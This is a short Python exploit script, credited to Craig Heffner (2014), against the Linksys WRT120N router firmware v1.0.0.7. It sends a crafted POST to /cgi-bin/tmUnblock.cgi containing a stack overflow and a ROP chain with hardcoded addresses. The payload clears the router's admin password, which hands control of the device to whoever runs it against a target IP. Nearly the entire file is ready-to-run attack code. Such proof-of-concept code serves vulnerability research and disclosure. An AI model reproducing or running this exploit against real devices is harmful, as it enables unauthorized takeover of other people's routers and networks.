#!/usr/bin/env python
#
# WRT120N v1.0.0.7 stack overflow, ROP to 4-byte overwrite which clears the admin password.
#
# Craig Heffner
# http://www.devttys0.com
# 2014-02-14

import sys
import urllib2

try:
    target = sys.argv[1]
except IndexError:
    print "Usage: %s <target ip>" % sys.argv[0]
    sys.exit(1)

url = target + '/cgi-bin/tmUnblock.cgi'
if '://' not in url:
    url = 'http://' + url

post_data = "period=0&TM_Block_MAC=00:01:02:03:04:05&TM_Block_URL="
post_data += "B" * 246                  # Filler
post_data += "\x81\x54\x4A\xF0"         # $s0, address of admin password in memory
post_data += "\x80\x31\xF6\x34"         # $ra
post_data += "C" * 0x28                 # Stack filler
post_data += "D" * 4                    # ROP 1 $s0, don't care
post_data += "\x80\x34\x71\xB8"         # ROP 1 $ra (address of ROP 2)
post_data += "E" * 8                    # Stack filler

for i in range(0, 4):
    post_data += "F" * 4                # ROP 2 $s0, don't care
    post_data += "G" * 4                # ROP 2 $s1, don't care
    post_data += "\x80\x34\x71\xB8"     # ROP 2 $ra (address of itself)
    post_data += "H" * (4-(3*(i/3)))    # Stack filler; needs to be 4 bytes except for the
                                        # last stack frame where it needs to be 1 byte (to
                                        # account for the trailing "\n\n" and terminating
                                        # NULL byte)

try:
    req = urllib2.Request(url, post_data)
    res = urllib2.urlopen(req)
except urllib2.HTTPError as e:
    if e.code == 500:
        print "OK"
    else:
        print "Received unexpected server response:", str(e)
except KeyboardInterrupt:
    pass